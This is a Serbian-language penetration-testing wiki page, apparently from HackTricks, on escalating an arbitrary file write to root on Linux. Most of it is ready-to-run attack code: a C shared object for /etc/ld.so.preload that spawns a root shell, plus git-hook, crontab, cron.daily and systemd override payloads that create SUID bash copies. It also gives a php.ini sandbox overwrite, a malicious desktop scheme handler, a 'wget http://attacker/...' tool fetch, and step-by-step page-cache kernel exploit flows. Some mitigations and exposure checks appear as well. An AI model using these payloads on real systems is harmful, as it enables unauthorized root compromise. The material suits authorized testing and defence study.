# Arbitrary File Write to Root

### /etc/ld.so.preload

`/etc/ld.so.preload` je sistemska lista shared objekata koje dynamic linker učitava pre drugih shared objekata. Secure-execution mode primenjuje dodatna ograničenja na preloading, tako da putanja biblioteke kao što je `/tmp/pe.so` nije univerzalna SUID-binary tehnika.\
Ako možete da kreirate ili izmenite ovaj fajl, proces koji ga učitava učitaće navedenu biblioteku pre svojih drugih shared objekata, što omogućava izvršavanje koda u kontekstu tog procesa.<sup>[[12]](#references)</sup>

Na primer: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** su izvršne skripte koje se pokreću za događaje u repozitorijumu, uključujući operacije commit i merge. Ako **privilegovana skripta ili korisnik** obavlja te radnje, a napadač može da **upisuje u `.git` folder**, hook može da se iskoristi za **eskalaciju privilegija**.<sup>[[13]](#references)</sup>

Na primer, moguće je **generisati skriptu** u git repozitorijumu, u direktorijumu **`.git/hooks`**, tako da se uvek izvršava kada se kreira novi commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Cron i vremenske datoteke

Ako možete da **pišete u datoteke povezane sa cron-om koje root izvršava**, obično možete dobiti code execution sledeći put kada se job pokrene. Zanimljive mete uključuju:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root-ov sopstveni crontab u `/var/spool/cron/` ili `/var/spool/cron/crontabs/`
- `systemd` timer-e i servise koje pokreću

Brze provere:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Tipični načini zloupotrebe:

- **Dodavanje novog root cron job-a** u `/etc/crontab` ili datoteku u `/etc/cron.d/`
- **Zamena skripte** koju `run-parts` već izvršava
- **Postavljanje backdoor-a u postojeći timer target** izmenom skripte ili binarne datoteke koju pokreće

Minimalni primer cron payload-a:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Ako možete da upisujete samo unutar cron direktorijuma koji koristi `run-parts`, umesto toga tamo postavite izvršnu datoteku:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Napomene:

- `run-parts` obično ignoriše nazive fajlova koji sadrže tačke, zato preferirajte nazive poput `backup` umesto `backup.sh`.<sup>[[15]](#references)</sup>
- Neki sistemi koriste `systemd` timere umesto klasičnog crona, ali ideja zloupotrebe je ista: **izmenite ono što će root kasnije izvršiti**.<sup>[[20]](#references)</sup>

### Service & Socket fajlovi

Ako možete da upisujete u **`systemd` unit fajlove** ili fajlove na koje oni upućuju, možda ćete moći da izvršite code kao root ponovnim učitavanjem i restartovanjem unita ili čekanjem da se aktivira putanja za aktivaciju service/socket-a.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Zanimljive mete uključuju:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in override-i u `/etc/systemd/system/<unit>.d/*.conf`
- Service skripte/binarni fajlovi na koje upućuju `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Putanje `EnvironmentFile=` u koje je moguće upisivati, a koje učitava root service

Brze provere:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Uobičajeni putevi zloupotrebe:

- **Overwrite `ExecStart=`** u service unit-u u vlasništvu root-a koji možete da menjate
- **Add a drop-in override** sa zlonamernim `ExecStart=` i prvo obrišite stari
- **Backdoor-ujte skriptu/binary** na koji unit već upućuje
- **Hijack-ujte socket-activated service** izmenom odgovarajućeg `.service` fajla koji se pokreće kada socket primi konekciju

Primer zlonamernog override-a:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Tipičan tok aktivacije:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Ako ne možete sami da restartujete servise, ali možete da izmenite socket-activated unit, možda je dovoljno samo da **sačekate klijentsku konekciju** kako biste pokrenuli izvršavanje backdoored servisa kao root.<sup>[[17]](#references)</sup>

### Overwrite a restrictive `php.ini` used by a privileged PHP sandbox

Neki custom daemoni proveravaju PHP koji je dostavio korisnik tako što pokreću `php` sa **ograničenim `php.ini`** fajlom (na primer, `disable_functions=exec,system,...`). Ako sandboxed kod i dalje ima **bilo kakav write primitive** (kao što je `file_put_contents`) i možete da pristupite **tačnoj putanji do `php.ini`** koju daemon koristi, možete da **prepišete tu konfiguraciju** da biste uklonili ograničenja, a zatim pošaljete drugi payload koji se izvršava sa povišenim privilegijama.<sup>[[2]](#references)</sup>

Tipičan tok:

1. Prvi payload prepisuje sandbox konfiguraciju.
2. Drugi payload izvršava kod sada kada su opasne funkcije ponovo omogućene.

Minimalni primer (zamenite putanju onom koju daemon koristi):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Ako daemon radi kao root (ili validira putanje u vlasništvu root korisnika), drugo izvršavanje daje root kontekst. To je u suštini **eskalacija privilegija putem prepisivanja konfiguracije** kada sandboxed runtime i dalje može da upisuje datoteke.

### binfmt_misc

`binfmt_misc` izlaže registracije u okviru `/proc/sys/fs/binfmt_misc`; svaka registracija povezuje obrazac tipa datoteke sa interpreterom. Uticaj na privilegije zavisi od toga ko može da menja registraciju i koji proces kasnije izvršava datoteku koja se podudara, zato proverite te uslove pre nego što ovo tretirate kao putanju za eskalaciju privilegija.<sup>[[21]](#references)</sup>

### Prepisivanje schema handlera (kao što su http: ili https:)

Desktop okruženja koriste MIME associations i desktop entries da bi izabrala aplikaciju za URI sheme; napadač koji može da upisuje u relevantnu konfiguraciju po korisniku i direktorijume sa desktop entries može da preusmeri te sheme na launcher koji kontroliše. Izmenom datoteke `$HOME/.config/mimeapps.list` tako da HTTP i HTTPS URL handleri upućuju na malicioznu datoteku (na primer, `x-scheme-handler/http=evil.desktop` i `x-scheme-handler/https=evil.desktop`), klik korisnika može da pozove taj desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root izvršava user-writable skripte/binarne datoteke

Ako privilegovani workflow pokrene nešto poput `/bin/sh /home/username/.../script` (ili bilo koji binary unutar direktorijuma u vlasništvu unprivileged korisnika), možete ga hijack-ovati:<sup>[[1]](#references)</sup>

- **Detektujte izvršavanje:** nadgledajte procese pomoću pspy da biste uhvatili kada root poziva putanje pod kontrolom korisnika.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Potvrdite mogućnost upisa:** uverite se da su i ciljna datoteka i njen direktorijum u vlasništvu vašeg korisnika i da vaš korisnik može da upisuje u njih.
- **Preotmite cilj:** napravite rezervnu kopiju originalnog binary-ja/script-a i ubacite payload koji kreira SUID shell (ili izvršava bilo koju drugu root radnju), zatim vratite dozvole:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Pokrenite privilegovanu radnju** (npr. pritiskanje UI dugmeta koje pokreće helper). Kada root ponovo izvrši preotetu putanju, preuzmite eskalirani shell pomoću `./rootshell -p`.

### Izmena privilegovanih binarnih datoteka samo u page cache-u

Neke greške u kernelu ne menjaju datoteku **na disku**. Umesto toga, omogućavaju izmenu samo **kopije u page cache-u** čitljive datoteke. Ako možete ciljati **setuid** ili na drugi način **root-executed** binarnu datoteku, sledeće izvršavanje može pokrenuti bajtove pod kontrolom napadača iz memorije i eskalirati privilegije, iako hash datoteke na disku ostaje nepromenjen.<sup>[[3]](#references)[[4]](#references)</sup>

Ovo je korisno posmatrati kao **runtime-only file write primitive**:<sup>[[3]](#references)</sup>

- **Disk ostaje čist**: inode i bajtovi na disku se ne menjaju
- **Memorija je izmenjena**: procesi koji čitaju/izvršavaju keširanu stranicu dobijaju sadržaj izmenjen od strane napadača
- **Efekat je privremen**: izmena nestaje nakon reboot-a ili izbacivanja iz cache-a

Ovaj primitive se nalazi između klasičnog **arbitrary file write** i starijih bugova zloupotrebe page cache-a, kao što su Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW se oslanjao na race
- Dirty Pipe je imao ograničenja pozicije upisa
- Primitive koji radi samo u page cache-u može biti pouzdaniji ako ranjiva putanja omogućava direktne upise u keširane file-backed stranice

#### Generic privesc flow

1. Nabavite kernel primitive koji može da upisuje u **file-backed page cache pages**
2. Iskoristite ga protiv **readable privileged binary** datoteke ili druge root-executed datoteke
3. Pokrenite izvršavanje **pre** nego što stranica bude izbačena iz cache-a
4. Dobijte code execution kao root dok datoteka na disku i dalje izgleda neizmenjeno

Tipične mete visoke vrednosti:

- **setuid-root** binarne datoteke
- Helper-i koje pokreću **root services**
- Binarne datoteke koje se često izvršavaju iz **containers sharing the host kernel/page cache**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) je dobar primer ove klase. Ranjiva putanja nalazila se u Linux crypto userspace API-ju (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` može da premesti reference na page-cache stranice iz čitljive datoteke u crypto TX scatterlist
- in-place `algif_aead` decrypt path ponovo je koristio source i destination buffer-e
- `authencesn` je zatim upisivao u destination tag region
- kada je taj region i dalje referencirao spliced file-backed stranice, upis je završio u **page cache-u ciljne datoteke**

Dakle, zanimljiva tehnika nije sam CVE, već obrazac:

- **ubaciti file-backed cache stranice u kernel subsystem**
- naterati subsystem da ih **tretira kao writable output**
- pokrenuti mali, kontrolisani overwrite u memoriji

Javni PoC koristio je ponovljene **4-byte writes** za patchovanje `/usr/bin/su` u memoriji, a zatim ga je izvršio.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) prikazuje drugu varijantu istog obrasca **page-cache-only write-to-root**, ali je ovog puta sink **IPsec ESP decrypt**, a ne `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Važna tehnika je korak **metadata-laundering**:

- `splice()` postavlja **read-only file-backed page-cache page** u ESP-in-UDP paket
- originalna DirtyFrag mitigation označila je taj skb sa `SKBFL_SHARED_FRAG`, tako da bi `esp_input()` izvršio **copy before decrypting**
- netfilter `TEE` duplicira paket kroz `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- clone zadržava **istu fizičku page-cache referencu**, ali gubi `SKBFL_SHARED_FRAG`
- `esp_input()` zatim clone tretira kao bezbedan i izvršava **in-place `cbc(aes)` decrypt** nad file-backed stranicom

Pouka za review je šira od samog CVE-a: ako mitigation zavisi od **skb/page metadata** da bi odlučila da li operacija prvo mora da izvrši copy, svaka **clone/copy putanja koja zadržava backing page, ali uklanja metadata** može neprimetno ponovo otvoriti write primitive.

Tipičan exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` za dobijanje **`CAP_NET_ADMIN` unutar privatnog network namespace-a**
2. podići loopback i instalirati **netfilter `TEE` rule** u `mangle/OUTPUT`
3. instalirati **XFRM ESP transport SAs** preko `NETLINK_XFRM`
4. kodirati svaku ciljnu 4-byte reč u SA `seq_hi` polje (DirtyFrag-ov word-selection trick)
5. poslati spliced ESP-in-UDP paket tako da **TEE clone** stigne do `esp_input()` i izvrši decrypt **in place**
6. ponavljati dok page-cache kopija `/usr/bin/su` ili druge privilegovane izvršne datoteke ne bude sadržala code pod kontrolom napadača

Operativno, uticaj je isti kao u `AF_ALG` primeru: datoteka na disku ostaje čista, ali `execve()` koristi **izmenjene bajtove iz page cache-a** i daje root.<sup>[[8]](#references)[[9]](#references)</sup>

Korisne provere izloženosti za ovu varijantu:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Kratkoročno smanjenje površine napada je i ovde specifično za putanju: nadogradnja na kernel koji sadrži `48f6a5356a33` ispravlja putanju za kloniranje, dok blokiranje automatskog učitavanja `xt_TEE` uklanja **korak za prikrivanje zastavica**, a blokiranje `esp4` / `esp6` uklanja **odredište za dešifrovanje**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Izloženost i hunting

Ako sumnjate na ovu klasu grešaka, nemojte se oslanjati samo na provere integriteta diska. Proverite i sledeće:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Vrednosti konfiguracije u nastavku razlikuju učitavajući interfejs od interfejsa ugrađenog u kernel; pravila za izgradnju crypto komponente mapiraju `CONFIG_CRYPTO_USER_API_AEAD` na `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` može da se učita/ukloni kao modul
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfejs je ugrađen u kernel
- setuid binarni fajlovi su dobre mete jer zakrpa koja zahvata samo page cache može biti dovoljna da lokalni foothold pretvori u root

#### Smanjenje attack surface-a za putanju `algif_aead`

Ako je ranjivi interfejs obezbeđen učitavajućim modulom:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Ako je kompajlirano u kernel, neka otkrivanja informacija prijavljena su kao blokiranje init putanje:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Ovu vrstu mitigation-a vredi zapamtiti i za druge kernel LPE-ove: ako exploitation zavisi od određenog optional interfejsa, njegovo onemogućavanje ili stavljanje na blacklist može prekinuti exploit path čak i pre nego što bude dostupna potpuna nadogradnja kernela.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – preuzimanje skripte koju izvršava root u PaperCut direktorijumu u koji korisnik može da upisuje](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) — FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security objava za CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable ispravka: crypto: algif_aead - vraćanje na rad out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint tehnički writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: analiza i exploitation Linux LPE varijante DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux ispravka: net: skb: očuvanje `SKBFL_SHARED_FRAG` u `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Ranija Linux mitigation: postavljanje `SKBFL_SHARED_FRAG` za spliced UDP pakete (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian manual page](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — dokumentacija Linux kernela](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Asocijacije MIME Applications](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specifikacija](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specifikacija](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig jezik](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: ranjivost page cache-a AF_ALG Linux kernela](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
{{#include ../../banners/hacktricks-training.md}}
